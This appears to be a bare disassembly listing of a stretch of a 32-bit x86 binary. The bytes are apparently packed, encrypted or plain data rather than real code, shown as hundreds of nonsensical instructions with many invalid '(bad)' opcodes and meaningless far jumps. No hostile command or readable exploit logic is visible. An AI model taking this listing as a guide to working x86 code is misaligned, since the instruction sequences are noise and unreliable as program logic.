  407fbf:	xor    DWORD PTR [edi+0x24afaf60],0x4e
  407fc6:	pop    ds
  407fc7:	pop    ss
  407fc8:	inc    eax
  407fc9:	sub    eax,0x78b073e7
  407fce:	outs   dx,DWORD PTR ds:[esi]
  407fcf:	mov    ds:0xe9a04676,al
  407fd4:	jae    0x407f75
  407fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd7:	fadd   st(2),st
  407fd9:	push   edx
  407fda:	mov    ds:0xf6ef3d1f,eax
  407fdf:	inc    esi
  407fe0:	xchg   ebp,eax
  407fe1:	test   BYTE PTR [esi],ch
  407fe3:	jnp    0x407fa7
  407fe5:	ins    DWORD PTR es:[edi],dx
  407fe6:	int3   
  407fe7:	aaa    
  407fe8:	(bad)  ds:0xd7450de7
  407fee:	adc    eax,0x79a78d59
  407ff3:	pop    ds
  407ff4:	add    DWORD PTR [ebx-0xa],ebx
  407ff7:	js     0x408018
  407ff9:	cli    
  407ffa:	scas   eax,DWORD PTR es:[edi]
  407ffb:	fs in  eax,dx
  407ffd:	rol    BYTE PTR [esi],0x25
  408000:	arpl   WORD PTR [ebx+0x59f10801],ax
  408006:	mov    esi,0x73c1d989
  40800b:	(bad)  
  40800c:	rcr    DWORD PTR ds:0xa95e19b2,1
  408012:	hlt    
  408013:	ret    0x77d9
  408016:	mov    ecx,edi
  408018:	es push edi
  40801a:	inc    ebp
  40801b:	scas   al,BYTE PTR es:[edi]
  40801c:	push   es
  40801d:	sbb    DWORD PTR [edx+0x4548cba2],eax
  408023:	xchg   esp,eax
  408024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408025:	mov    ebx,0xdd91d7c8
  40802a:	in     al,dx
  40802b:	sub    eax,0x447a7ece
  408030:	cmp    eax,0x8dfe0536
  408035:	pop    edi
  408036:	sbb    cl,BYTE PTR [ecx+0x13816a2]
  40803c:	hlt    
  40803d:	xchg   DWORD PTR [ecx-0x74],ecx
  408040:	(bad)  [edi]
  408042:	(bad)  
  408043:	mov    edi,0x21bb004
  408048:	xchg   edx,eax
  408049:	clc    
  40804a:	xchg   esp,eax
  40804b:	xor    DWORD PTR [edi+0x4f6b8a48],0xffffffeb
  408052:	jae    0x408055
  408054:	mov    ebp,0x73e32077
  408059:	fwait
  40805a:	pusha  
  40805b:	pop    edx
  40805c:	adc    al,0x59
  40805e:	jge    0x408070
  408060:	sbb    bl,BYTE PTR [ebx-0x36]
  408063:	cmp    bh,BYTE PTR [ecx+0x3ff0185e]
  408069:	cmp    eax,0x56658ef
  40806e:	scas   al,BYTE PTR es:[edi]
  40806f:	sub    dh,al
  408071:	nop
  408072:	cmp    eax,0x72ca3e54
  408077:	aam    0xb6
  408079:	sub    eax,DWORD PTR [edx-0x6370e2cd]
  40807f:	push   cs
  408080:	cdq    
  408081:	xchg   ecx,eax
  408082:	pusha  
  408083:	lds    esi,FWORD PTR [edx]
  408085:	sbb    ah,BYTE PTR [esi+ebx*4]
  408088:	das    
  408089:	shr    DWORD PTR [edi-0x2983b773],0xac
  408090:	std    
  408091:	ins    BYTE PTR es:[edi],dx
  408092:	push   0xfd0707ea
  408097:	popf   
  408098:	add    BYTE PTR [ecx+0x3bf8331d],dh
  40809e:	mov    eax,ds:0x6457a34d
  4080a3:	cdq    
  4080a4:	shr    ecx,cl
  4080a6:	and    DWORD PTR [ecx-0x5d993b4c],0xffffffbb
  4080ad:	cmc    
  4080ae:	mov    ch,0x42
  4080b0:	sub    edx,DWORD PTR [ecx-0x72]
  4080b3:	test   DWORD PTR [ebx-0x51],0xa1f9c173
  4080ba:	add    al,0x71
  4080bc:	sbb    eax,0x87b72b37
  4080c1:	lea    edi,[ebx+0x31]
  4080c4:	mov    eax,ds:0x48eb5970
  4080c9:	sahf   
  4080ca:	pop    edx
  4080cb:	enter  0x8bd8,0x86
  4080cf:	cwde   
  4080d0:	mov    al,BYTE PTR [ebx+0x1798c98f]
  4080d6:	jmp    0x40807c
  4080d8:	and    DWORD PTR [ecx+edx*2],ecx
  4080db:	mov    ds:0x1509cd9e,al
  4080e0:	jns    0x408147
  4080e2:	jge    0x40813a
  4080e4:	sbb    esi,ebp
  4080e6:	iret   
  4080e7:	iret   
  4080e8:	inc    ebx
  4080e9:	leave  
  4080ea:	sbb    eax,0x26c5ee9c
  4080ef:	and    esp,ecx
  4080f1:	lods   eax,DWORD PTR ds:[esi]
  4080f2:	xchg   DWORD PTR [eax+0x2e9d9bd6],esp
  4080f8:	mul    BYTE PTR [edi+0x5be36a5d]
  4080fe:	lock sbb eax,0xab2e637e
  408104:	sub    al,0x6a
  408106:	dec    ebx
  408107:	mov    ebp,0x7b6a87f6
  40810c:	and    ecx,DWORD PTR [edi-0x418531ca]
  408112:	push   esp
  408113:	mov    ds:0x46600705,al
  408118:	and    ecx,DWORD PTR [edx]
  40811a:	dec    cx
  40811c:	push   cs
  40811d:	cwde   
  40811e:	xlat   BYTE PTR ds:[ebx]
  40811f:	mov    dh,0x55
  408121:	into   
  408122:	scas   eax,DWORD PTR es:[edi]
  408123:	mov    BYTE PTR [edx-0x6a],dl
  408126:	fs ins BYTE PTR es:[edi],dx
  408128:	adc    eax,0xd2b9da38
  40812d:	mov    bh,0x55
  40812f:	gs (bad) 
  408131:	mov    esi,0x7a37d061
  408136:	dec    ebp
  408137:	int    0xa0
  408139:	scas   eax,DWORD PTR es:[edi]
  40813a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40813b:	sbb    esp,DWORD PTR [edi]
  40813d:	and    cl,al
  40813f:	push   ds
  408140:	adc    edx,DWORD PTR [eax]
  408142:	not    BYTE PTR [eax]
  408144:	mov    eax,0xa0810909
  408149:	nop
  40814a:	cld    
  40814b:	cdq    
  40814c:	mov    ecx,0xf67b7ebc
  408151:	add    esp,DWORD PTR [ecx+0x397b3dea]
  408157:	cmp    edx,ebx
  408159:	dec    edi
  40815a:	sbb    DWORD PTR cs:[ebx],0xffffff9f
  40815e:	adc    DWORD PTR [edx+0x45],0xffffffbc
  408162:	cmp    al,0x53
  408164:	jmp    0x408117
  408166:	ja     0x40813f
  408168:	mov    ebp,0x9db00f5b
  40816d:	jns    0x40812d
  40816f:	mov    cl,0x71
  408171:	test   BYTE PTR [esi+0x59],dh
  408174:	adc    ebp,DWORD PTR [eax+ebp*8-0x3a]
  408178:	or     DWORD PTR [eax+esi*2+0x692dd6a5],ecx
  40817f:	or     DWORD PTR [ecx],ebp
  408181:	cdq    
  408182:	dec    esp
  408183:	daa    
  408184:	jg     0x408120
  408186:	shl    DWORD PTR [eax+0x286cea43],1
  40818c:	adc    al,0x14
  40818e:	fstp   TBYTE PTR [edi+0x376b1b5b]
  408194:	jmp    0x87e4:0xb82a4bc0
  40819b:	adc    eax,0xf59c31d7
  4081a0:	xor    eax,ebp
  4081a2:	lock pop ebp
  4081a4:	sub    BYTE PTR [edi+0x21],dl
  4081a7:	outs   dx,BYTE PTR ds:[esi]
  4081a8:	lock les ebp,FWORD PTR [ebx]
  4081ab:	rol    cl,1
  4081ad:	sub    al,0xe
  4081af:	adc    ah,BYTE PTR [esi]
  4081b1:	scas   eax,DWORD PTR es:[edi]
  4081b2:	scas   al,BYTE PTR es:[edi]
  4081b3:	push   eax
  4081b4:	pop    edx
  4081b5:	jle    0x4081c0
  4081b7:	ret    0x5020
  4081ba:	fwait
  4081bb:	dec    ecx
  4081bc:	into   
  4081bd:	test   DWORD PTR [ebx-0x30],esi
  4081c0:	cmp    eax,0x3aef45a5
  4081c5:	inc    eax
  4081c6:	pushf  
  4081c7:	jb     0x408187
  4081c9:	mov    ch,0x50
  4081cb:	mov    esi,0xc2ba1a1f
  4081d0:	popf   
  4081d1:	(bad)  
  4081d2:	sub    al,0xe8
  4081d4:	into   
  4081d5:	imul   esp,DWORD PTR [ebx-0x45468942],0xffffff89
  4081dc:	pop    esi
  4081dd:	dec    edi
  4081de:	popf   
  4081df:	data16 xlat BYTE PTR ds:[ebx]
  4081e1:	inc    ebx
  4081e2:	dec    ebx
  4081e3:	sub    ah,cl
  4081e5:	xchg   DWORD PTR [ebp-0x528d9c15],ecx
  4081eb:	adc    BYTE PTR [ecx-0x3f03bec2],ah
  4081f1:	mov    dh,0xd1
  4081f3:	das    
  4081f4:	pop    ecx
  4081f5:	imul   BYTE PTR ds:0x893c523e
  4081fb:	dec    ebx
  4081fc:	sub    DWORD PTR [esp+ebp*8],0x55
  408200:	push   0xc6d20b35
  408205:	and    eax,0x7df94ff5
  40820a:	fmul   st(1),st
  40820c:	jb     0x408234
  40820e:	stos   DWORD PTR es:[edi],eax
  40820f:	dec    esi
  408210:	pop    ebx
  408211:	sub    ebp,0x1ad3ca18
  408217:	(bad)  
  408218:	dec    edi
  408219:	nop
  40821a:	xchg   ecx,eax
  40821b:	xchg   ebx,eax
  40821c:	dec    DWORD PTR [esp+ebp*4+0x20]
  408220:	pop    ebx
  408221:	push   esp
  408222:	mov    edx,0x411a4285
  408227:	enter  0x7a8d,0xab
  40822b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40822c:	shl    eax,1
  40822e:	and    eax,0x2f5360f8
  408233:	les    ebp,FWORD PTR [ecx+edx*2-0x7f]
  408237:	mov    al,ds:0x18a18c38
  40823c:	stos   DWORD PTR es:[edi],eax
  40823d:	pusha  
  40823e:	out    0x8f,al
  408240:	pop    esi
  408241:	jno    0x408284
  408243:	loop   0x4081f8
  408245:	ja     0x4082a2
  408247:	add    bp,cx
  40824a:	stos   BYTE PTR es:[edi],al
  40824b:	push   cs
  40824c:	and    al,0xde
  40824e:	in     eax,dx
  40824f:	jnp    0x4082a1
  408251:	push   eax
  408252:	or     BYTE PTR [eax+0x6c],0xde
  408256:	mov    ds:0xf92c99e4,eax
  40825b:	adc    BYTE PTR [esi-0x2f8bd193],0x99
  408262:	mov    ah,0x4b
  408264:	inc    ecx
  408265:	scas   eax,DWORD PTR es:[edi]
  408266:	xchg   edx,eax
  408267:	dec    eax
  408268:	mov    ebp,0x1cde7c4d
  40826d:	test   eax,0x601d8e1a
  408272:	enter  0x41f5,0x39
  408276:	stos   DWORD PTR es:[edi],eax
  408277:	adc    DWORD PTR [eax+0x6d3c28d5],esi
  40827d:	push   eax
  40827e:	test   DWORD PTR [esi-0x5b],ebx
  408281:	mov    ebx,0xc400333f
  408286:	and    ecx,eax
  408288:	aaa    
  408289:	addr16 pop ebx
  40828b:	scas   eax,DWORD PTR es:[edi]
  40828c:	in     eax,0x77
  40828e:	imul   esp,DWORD PTR ds:0x99ef9fe1,0xacb89717
  408298:	mov    ebp,0x1b0073b1
  40829d:	pusha  
  40829e:	or     DWORD PTR [edx+eiz*4],edi
  4082a1:	rol    BYTE PTR [ecx-0x55],1
  4082a4:	addr16 mov al,ds:0x73d
  4082a8:	inc    eax
  4082a9:	xor    edx,esi
  4082ab:	call   0x117b:0x1006effe
  4082b2:	inc    esi
  4082b3:	stc    
  4082b4:	cmp    al,0x77
  4082b6:	and    eax,0xcfe8846e
  4082bb:	fsubr  st(0),st
  4082bd:	hlt    
  4082be:	retf   0xcae1
  4082c1:	add    DWORD PTR [esi],ebp
  4082c3:	xchg   edx,eax
  4082c4:	loop   0x408305
  4082c6:	and    DWORD PTR [eax],ebx
  4082c8:	in     eax,0xb9
  4082ca:	sub    BYTE PTR [eax],al
  4082cc:	or     eax,0xeb33279b
  4082d1:	into   
  4082d2:	push   ss
  4082d3:	cwde   
  4082d4:	stos   DWORD PTR es:[edi],eax
  4082d5:	stos   DWORD PTR es:[edi],eax
  4082d6:	les    edx,FWORD PTR [ebp-0x5909eb45]
  4082dc:	push   edx
  4082dd:	sbb    ebp,DWORD PTR [ebp+0x5981dc9f]
  4082e3:	inc    esi
  4082e4:	in     eax,0x45
  4082e6:	or     DWORD PTR [eax+0x6e],ebp
  4082e9:	mov    al,ds:0x1ad2bc88
  4082ee:	sub    eax,DWORD PTR [eax+eiz*8-0x35ecab2b]
  4082f5:	or     dl,BYTE PTR [eax]
  4082f7:	sub    al,0xc3
  4082f9:	xchg   ebx,eax
  4082fa:	add    bp,bx
  4082fd:	dec    esp
  4082fe:	dec    ecx
  4082ff:	inc    esp
  408300:	xor    ebx,edx
  408302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408303:	add    bl,BYTE PTR ds:0x541bc07
  408309:	aaa    
  40830a:	jo     0x4082bb
  40830c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40830d:	shl    BYTE PTR [edi],1
  40830f:	or     eax,edx
  408311:	stos   BYTE PTR es:[edi],al
  408312:	lea    edx,[edi]
  408314:	mov    eax,0x6d99c269
  408319:	or     eax,0x5f1959f8
  40831e:	inc    ecx
  40831f:	push   ebx
  408320:	jecxz  0x408383
  408322:	push   ebp
  408323:	inc    ecx
  408324:	fimul  DWORD PTR [ecx-0x60]
  408327:	idiv   BYTE PTR [eax+ecx*2]
  40832a:	enter  0x486e,0x28
  40832e:	push   es
  40832f:	mov    edi,DWORD PTR es:[edi]
  408332:	xlat   BYTE PTR ds:[ebx]
  408333:	call   0xf448:0x1b7a2b5f
  40833a:	add    al,0x22
  40833c:	scas   eax,DWORD PTR es:[edi]
  40833d:	and    eax,0xa3157e7a
  408342:	popa   
  408343:	in     al,dx
  408344:	into   
  408345:	jg     0x408311
  408347:	add    BYTE PTR fs:[ebp+0x5b],dl
  40834b:	jge    0x4083bc
  40834d:	or     DWORD PTR [edi+0x27],esp
  408350:	imul   ebx,DWORD PTR [esi],0xffffffd3
  408353:	fadd   DWORD PTR ds:0x5a029739
  408359:	mov    al,0xb5
  40835b:	sbb    ebp,edx
  40835d:	mov    ebx,0x28e4e87a
  408362:	fisttp DWORD PTR [esi]
  408364:	nop
  408365:	nop
  408366:	aam    0xda
  408368:	adc    al,BYTE PTR [esi]
  40836a:	mov    DWORD PTR [ebx],eax
  40836c:	mov    esp,gs
  40836e:	into   
  40836f:	shl    BYTE PTR [edi+0x3efa0881],1
  408375:	inc    esi
  408376:	out    dx,al
  408377:	aam    0xa5
  408379:	mov    cl,0x4c
  40837b:	mov    ecx,0xd0ed9536
  408380:	pop    ebp
  408381:	outs   dx,DWORD PTR ds:[esi]
  408382:	sbb    ebp,ebp
  408384:	ss inc ecx
  408386:	sahf   
  408387:	fdivr  st,st(4)
  408389:	sub    DWORD PTR [ecx+eiz*2+0x466ca071],eax
  408390:	shl    BYTE PTR [edx-0x5aebe044],1
  408396:	cmp    al,0xb0
  408398:	and    eax,0xf5cbe5e8
  40839d:	scas   al,BYTE PTR es:[edi]
  40839e:	adc    BYTE PTR [ecx+0x1658b0da],0x82
  4083a5:	enter  0x9154,0x39
  4083a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083aa:	xor    al,0x8b
  4083ac:	mov    esi,0x31e24947
  4083b1:	fst    st(4)
  4083b3:	jnp    0x408429
  4083b5:	outs   dx,BYTE PTR ds:[esi]
  4083b6:	gs mov edx,0xb0b8faeb
  4083bc:	call   0x1039:0x88d0f841
  4083c3:	(bad)  
  4083c4:	daa    
  4083c5:	ja     0x4083cb
  4083c7:	icebp  
  4083c8:	ds dec esp
  4083ca:	scas   eax,DWORD PTR es:[edi]
  4083cb:	out    0x27,eax
  4083cd:	test   al,0xd9
  4083cf:	retf   0x430c
  4083d2:	int3   
  4083d3:	popf   
  4083d4:	cdq    
  4083d5:	mov    edi,0xbbbc3e34
  4083da:	inc    ebx
  4083db:	push   ss
  4083dc:	pop    esp
  4083dd:	ror    BYTE PTR [ebx+0x32486f88],0x88
  4083e4:	mov    edi,0x7c8fcec7
  4083ea:	adc    al,0xb8
  4083ec:	stc    
  4083ed:	or     cl,BYTE PTR [ebx+0x7ac78d8]
  4083f3:	jle    0x4083ab
  4083f5:	ins    BYTE PTR es:[edi],dx
  4083f6:	pop    ebx
  4083f7:	cmp    eax,0x1c40de7e
  4083fc:	lods   eax,DWORD PTR ds:[esi]
  4083fd:	xchg   ebp,eax
  4083fe:	mov    eax,ds:0x1b84e9ad
  408403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408404:	daa    
  408405:	xlat   BYTE PTR ds:[ebx]
  408406:	outs   dx,DWORD PTR ds:[esi]
  408407:	cmp    eax,0xab530647
  40840c:	push   cs
  40840d:	pop    ds
  40840e:	cwde   
  40840f:	je     0x408464
  408411:	fdivr  QWORD PTR [edi+eiz*4+0x28]
  408415:	fsubr  QWORD PTR [esi+0x7d0bfb63]
  40841b:	adc    al,0x42
  40841d:	push   0x60
  40841f:	(bad)  
  408420:	xchg   esp,eax
  408421:	fdiv   DWORD PTR [ecx-0x1f]
  408424:	jp     0x408433
  408426:	mov    bl,0xfc
  408428:	sbb    ecx,DWORD PTR fs:[eax]
  40842b:	gs (bad) 
  40842d:	retf   0x50b0
  408430:	sahf   
  408431:	aaa    
  408432:	out    dx,al
  408433:	add    BYTE PTR [esi-0xe],0xed
  408437:	jo     0x40842c
  408439:	mov    ds:0x1532c2cd,al
  40843e:	mov    esp,0x72ace911
  408443:	mov    edi,0x6cd65e63
  408448:	cmp    bh,0xb5
  40844b:	repz stc 
  40844d:	and    eax,0x922a272e
  408452:	inc    ecx
  408453:	pop    eax
  408454:	out    dx,eax
  408455:	sub    eax,0x54c1a0d8
  40845a:	jne    0x408442
  40845c:	cmp    esp,ecx
  40845e:	fadd   QWORD PTR [edi+0x32]
  408461:	push   esi
  408462:	inc    ebp
  408463:	fnsave [eax+eax*2+0x22]
  408467:	(bad)  
  408468:	ins    DWORD PTR es:[edi],dx
  408469:	adc    al,0xac
  40846b:	dec    ebx
  40846c:	pop    ds
  40846d:	xchg   DWORD PTR [eax],edi
  40846f:	retf   
  408470:	cwde   
  408471:	call   0xb097:0xe540e564
  408478:	adc    eax,0x7a072ada
  40847d:	sbb    eax,0x8fac8df2
  408482:	fisttp DWORD PTR [ecx-0x46]
  408485:	cdq    
  408486:	xchg   edi,eax
  408487:	iret   
  408488:	dec    edx
  408489:	cmp    DWORD PTR [esi-0x19079a74],0x5857f908
  408493:	repz mov ds:0xf9dfa90e,eax
  408499:	push   ecx
  40849a:	jmp    0x9195:0xbf1872b4
  4084a1:	push   ds
  4084a2:	fucomi st,st(4)
  4084a4:	push   edx
  4084a5:	and    DWORD PTR [edx+0x4b],edi
  4084a8:	and    DWORD PTR gs:[eax+0x40e325d4],esi
  4084af:	outs   dx,BYTE PTR ds:[esi]
  4084b0:	cmp    al,0x9d
  4084b2:	in     al,0x1b
  4084b4:	or     DWORD PTR [edx],0x425123e8
  4084ba:	xor    eax,0xd8530030
  4084bf:	mov    edx,ss
  4084c1:	push   cs
  4084c2:	mov    es,WORD PTR [ebx-0x423bb97]
  4084c8:	mov    ds:0xa517ed1,eax
  4084cd:	push   0x2a
  4084cf:	and    DWORD PTR [edx+0x0],0xdadb34a
  4084d6:	fcom   QWORD PTR [ebp+0x660cec9b]
  4084dc:	shr    BYTE PTR [ecx-0x19],cl
  4084df:	xor    ebx,DWORD PTR [esi+eax*4-0x33e6ea87]
  4084e6:	cmp    eax,0x1e445869
  4084eb:	sbb    DWORD PTR [edx],ebx
  4084ed:	dec    eax
  4084ee:	fiadd  DWORD PTR [ecx-0x56]
  4084f1:	ds add al,0x85
  4084f4:	scas   al,BYTE PTR es:[edi]
  4084f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084f6:	stos   BYTE PTR es:[edi],al
  4084f7:	fadd   DWORD PTR [ebp+0x23]
  4084fa:	cld    
  4084fb:	xchg   esi,eax
  4084fc:	push   ebp
  4084fd:	rol    ebp,cl
  4084ff:	scas   eax,DWORD PTR es:[edi]
  408500:	dec    eax
  408501:	cmp    DWORD PTR [edi+0x72],eax
  408504:	sub    eax,0x7c9bfb70
  408509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40850a:	cmp    DWORD PTR [esi+0x2d8f2909],ebp
  408510:	call   0xd773:0x94bcf70c
  408517:	std    
  408518:	cli    
  408519:	push   ecx
  40851a:	addr16 mov ecx,0x4815e357
  408520:	test   ebx,ebp
  408522:	not    eax
  408524:	xchg   ebp,eax
  408525:	sub    al,0xfd
  408527:	call   0xf831313c
  40852c:	mov    ebx,0x66a14096
  408531:	sub    ebx,ecx
  408533:	cdq    
  408534:	stos   DWORD PTR es:[edi],eax
  408535:	jmp    0x45b350ed
  40853a:	enter  0x266f,0xb4
  40853e:	push   eax
  40853f:	imul   edx,DWORD PTR [esi],0xffffffcf
  408542:	or     ch,bh
  408544:	push   ss
  408545:	inc    ebp
  408546:	xor    al,0x69
  408548:	xchg   edx,eax
  408549:	mov    ch,0x4b
  40854b:	mov    ds:0x41a23e78,al
  408550:	xor    DWORD PTR [ecx+0x69],ebp
  408553:	pop    es
  408554:	neg    BYTE PTR [ecx+ecx*1+0x6a5a49a9]
  40855b:	mov    edi,0x5ac045c3
  408560:	mov    BYTE PTR [edx],bh
  408562:	add    eax,DWORD PTR [eax]
  408564:	ret    
  408565:	adc    eax,0xfc59d439
  40856a:	jo     0x408561
  40856c:	inc    eax
  40856d:	mov    esp,0xf8a5ccc7
  408572:	mov    bh,0x27
  408574:	inc    ebp
  408575:	adc    ecx,DWORD PTR [esi+0x4]
  408578:	mov    DWORD PTR [eax-0x5895047f],edi
  40857e:	push   edx
  40857f:	sub    al,0x7e
  408581:	sub    bh,ch
  408583:	cmp    al,0x39
  408585:	inc    ebp
  408586:	pusha  
  408587:	ja     0x408579
  408589:	sti    
  40858a:	or     dh,BYTE PTR [esi]
  40858c:	adc    BYTE PTR [ebx],0x64
  40858f:	mov    bl,0xac
  408591:	xlat   BYTE PTR ds:[ebx]
  408592:	mov    ds:0x101cef42,eax
  408597:	mov    edx,ebp
  408599:	sar    DWORD PTR [eax],0xb3
  40859c:	pop    eax
  40859d:	shl    BYTE PTR [ebp+0x41468f5d],0xe6
  4085a4:	test   al,0x96
  4085a6:	jmp    0x408591
  4085a8:	add    al,0xd0
  4085aa:	push   0xfa4383b2
  4085af:	in     eax,0x8d
  4085b1:	test   BYTE PTR [edi+0x71],dl
  4085b4:	pushf  
  4085b5:	ins    BYTE PTR es:[edi],dx
  4085b6:	test   al,0xf5
  4085b8:	test   dh,bl
  4085ba:	cmp    BYTE PTR [edx+edi*4-0x6b],0x9f
  4085bf:	dec    ebp
  4085c0:	cli    
  4085c1:	pop    ss
  4085c2:	sbb    BYTE PTR [eax+0x4a852ed8],bh
  4085c8:	in     al,0xe3
  4085ca:	pop    es
  4085cb:	lahf   
  4085cc:	cs out dx,al
  4085ce:	push   ss
  4085cf:	rcr    edi,1
  4085d1:	jo     0x4085a8
  4085d3:	and    eax,0x28cae0c0
  4085d8:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  4085df:	mov    eax,DWORD PTR [ebp-0x4]
  4085e2:	jmp    0x40a991
  4085e7:	sbb    eax,0x84488431
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0x1
  4085f4:	ins    BYTE PTR es:[edi],dx
  4085f5:	add    al,0xe9
  4085f7:	jns    0x408612
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0x41
  408600:	jae    0x408614
  408602:	cmp    eax,0xcd6424d7
  408607:	sub    BYTE PTR [edx-0x22],ch
  40860a:	cdq    
  40860b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40860c:	pop    edx
  40860d:	stos   BYTE PTR es:[edi],al
  40860e:	xor    DWORD PTR [edx-0x3c],ecx
  408611:	int3   
  408612:	js     0x4085df
  408614:	or     bh,BYTE PTR ds:0xc5e0396a
  40861a:	in     al,0x22
  40861c:	ret    
  40861d:	adc    al,0xa7
  40861f:	mov    ds:0x7dcb6626,eax
  408624:	jge    0x408676
  408626:	loope  0x408667
  408628:	dec    edx
  408629:	inc    esp
  40862a:	xchg   esi,eax
  40862b:	push   ebp
  40862c:	mov    WORD PTR [esi*2-0x596e1f9e],cs
  408633:	ins    BYTE PTR es:[edi],dx
  408634:	enter  0x3225,0x41
  408638:	inc    ebp
  408639:	dec    edi
  40863a:	in     al,dx
  40863b:	loop   0x40867e
  40863d:	dec    ebx
  40863e:	fucomi st,st(7)
  408640:	xchg   ebp,eax
  408641:	stc    
  408642:	fsub   QWORD PTR [esi*2+0x426b3cbe]
  408649:	mov    bl,0x6
  40864b:	sub    DWORD PTR [ecx],0x1a
  40864e:	pop    esp
  40864f:	arpl   WORD PTR ds:0x71cc3eb0,bp
  408655:	mov    esi,DWORD PTR [edx-0x188c7f7b]
  40865b:	or     eax,0xacb02918
  408660:	sti    
  408661:	stos   DWORD PTR es:[edi],eax
  408662:	jp     0x4086c9
  408664:	mov    ds:0xfc063c0e,al
  408669:	arpl   sp,si
  40866b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40866c:	mov    bh,0x1f
  40866e:	xor    DWORD PTR ds:0xada956fa,edi
  408674:	retf   
  408675:	dec    ebp
  408676:	jl     0x40865f
  408678:	cmp    al,0x8f
  40867a:	cld    
  40867b:	mov    edi,DWORD PTR [ebp-0x210b1eb9]
  408681:	push   ecx
  408682:	jb     0x4086d2
  408684:	push   ds
  408685:	inc    esi
  408686:	pop    ds
  408687:	daa    
  408688:	fwait
  408689:	ror    DWORD PTR [ebx-0x2],1
  40868c:	sub    bl,cl
  40868e:	popf   
  40868f:	enter  0x4a28,0xb1
  408693:	push   ds
  408694:	inc    ecx
  408695:	add    BYTE PTR gs:[esi+0x2f],cl
  408699:	fisub  DWORD PTR [edx-0x58]
  40869c:	sub    BYTE PTR [eax+0x7c],0xe
  4086a0:	(bad)  
  4086a1:	ins    DWORD PTR es:[edi],dx
  4086a2:	xchg   edi,eax
  4086a3:	jno    0x408691
  4086a5:	pop    esi
  4086a6:	arpl   WORD PTR [eax],di
  4086a8:	mov    bh,0xe2
  4086aa:	inc    esp
  4086ab:	cmp    BYTE PTR ds:0xe8198ea9,cl
  4086b1:	adc    edi,DWORD PTR [edx+0x74]
  4086b4:	add    dh,BYTE PTR ds:0x3bd39cff
  4086ba:	cmc    
  4086bb:	mov    edi,0x83d2cbc3
  4086c0:	inc    ecx
  4086c1:	mov    edx,0x43e1eb21
  4086c6:	adc    ecx,DWORD PTR [ebx+0x1f9c9212]
  4086cc:	or     esp,DWORD PTR [ecx]
  4086ce:	loop   0x4086d5
  4086d0:	shl    DWORD PTR [edi-0x53],cl
  4086d3:	rol    BYTE PTR [ebx],1
  4086d5:	mov    cs,esp
  4086d7:	pmaxsw mm5,QWORD PTR [edx+0x1410e50e]
  4086de:	dec    ebp
  4086df:	jecxz  0x40867e
  4086e1:	inc    edx
  4086e2:	loope  0x408762
  4086e4:	ret    
  4086e5:	test   al,0x28
  4086e7:	jle    0x40871f
  4086e9:	lea    edx,[eax+0x40]
  4086ec:	jo     0x40870b
  4086ee:	mov    eax,0x320549f4
  4086f3:	adc    DWORD PTR [ebx+ebp*2-0x4ae2f5e6],ecx
  4086fa:	shl    DWORD PTR [ebp-0x20],0x8a
  4086fe:	xchg   ebx,eax
  4086ff:	cmp    DWORD PTR [esi],ebx
  408701:	fadd   QWORD PTR [eax-0x72]
  408704:	sub    DWORD PTR [ecx+0x1b],ecx
  408707:	mov    cs,WORD PTR [eax]
  408709:	xor    al,0x3
  40870b:	scas   eax,DWORD PTR es:[edi]
  40870c:	call   0x52b22f9
  408711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408712:	inc    ecx
  408713:	lods   al,BYTE PTR ds:[esi]
  408714:	mov    eax,0x3880a364
  408719:	jbe    0x408734
  40871b:	mov    edi,eax
  40871d:	adc    DWORD PTR [ecx+esi*2-0x37],ebp
  408721:	xor    ch,BYTE PTR [ebx]
  408723:	int    0x51
  408725:	int    0x65
  408727:	xchg   esi,eax
  408728:	std    
  408729:	jb     0x4086fd
  40872b:	mov    edx,0x4078b77f
  408730:	ins    DWORD PTR es:[edi],dx
  408731:	and    al,0x8
  408733:	pop    edi
  408734:	fld    TBYTE PTR [edx-0x65]
  408737:	fild   WORD PTR ds:0x6de526b1
  40873d:	dec    edi
  40873e:	popf   
  40873f:	mov    ebx,DWORD PTR [edi]
  408741:	nop
  408742:	push   ds
  408743:	rcl    DWORD PTR es:[ebx-0x1e21c94],cl
  40874a:	adc    cl,BYTE PTR [esi-0x491eb3e2]
  408750:	mov    ecx,0x7e2d701f
  408755:	test   DWORD PTR [esi+0x641923b8],ebx
  40875b:	daa    
  40875c:	(bad)  
  40875d:	ins    BYTE PTR es:[edi],dx
  40875e:	or     ah,ah
  408760:	aam    0xa
  408762:	cld    
  408763:	dec    edi
  408764:	dec    esi
  408765:	mov    eax,0xae859c13
  40876a:	add    cl,dh
  40876c:	bound  bx,DWORD PTR [esi+eax*4+0x35]
  408771:	add    ah,BYTE PTR [eax]
  408773:	inc    ecx
  408774:	pop    ebx
  408775:	sbb    esi,edi
  408777:	inc    esi
  408778:	adc    DWORD PTR [edx+0x47d66da],edi
  40877e:	in     eax,dx
  40877f:	xor    DWORD PTR [ecx-0x10459075],eax
  408785:	xor    eax,DWORD PTR [ecx]
  408787:	lds    ebp,FWORD PTR [ebp+0x1b]
  40878a:	cdq    
  40878b:	pusha  
  40878c:	fist   WORD PTR [eax]
  40878e:	adc    dh,al
  408790:	jmp    0x8539:0xd514e8c5
  408797:	aas    
  408798:	mov    ebp,0x6482134
  40879d:	mov    dl,0x7e
  40879f:	dec    edx
  4087a0:	sahf   
  4087a1:	call   0xf912:0xd2835d8a
  4087a8:	xor    DWORD PTR [ecx],ebp
  4087aa:	cld    
  4087ab:	sub    eax,0x8c15dd2b
  4087b0:	dec    ebp
  4087b1:	(bad)  
  4087b2:	mov    esp,0x588d6b21
  4087b7:	fdivr  DWORD PTR [edx]
